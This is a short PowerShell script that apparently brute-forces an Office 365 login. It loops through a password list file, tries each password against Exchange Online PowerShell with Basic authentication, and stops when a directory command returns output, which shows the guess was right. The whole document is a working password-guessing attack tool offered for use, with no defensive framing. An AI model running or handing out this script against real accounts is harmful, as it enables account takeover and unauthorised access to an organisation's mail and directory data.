# Login to O365
Import-Module MSOnline 
# Account
$username = “whatever@microsoft.com”
# Attempt logins using every password in your password list
$x = 0
foreach ($password in get-content passwd.txt) {
    $x = $x + 1;
    Write-Host “Attempt #$x”
    Write-Host “Trying password $passwd”
        $passwd = $password | ConvertTo-SecureString -asPlainText -Force
        $O365Cred = New-Object System.Management.Automation.PSCredential($username, $passwd)
        $O365Session = New-PSSession –ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.outlook.com/powershell -Credential $O365Cred -Authentication Basic -AllowRedirection
            Connect-MsolService –Credential $O365Cred
    #Check a command. If the command has output that means your password is good.
        $Domains = Get-Msoldomain
            if ($Domains) {
            exit
    }
}
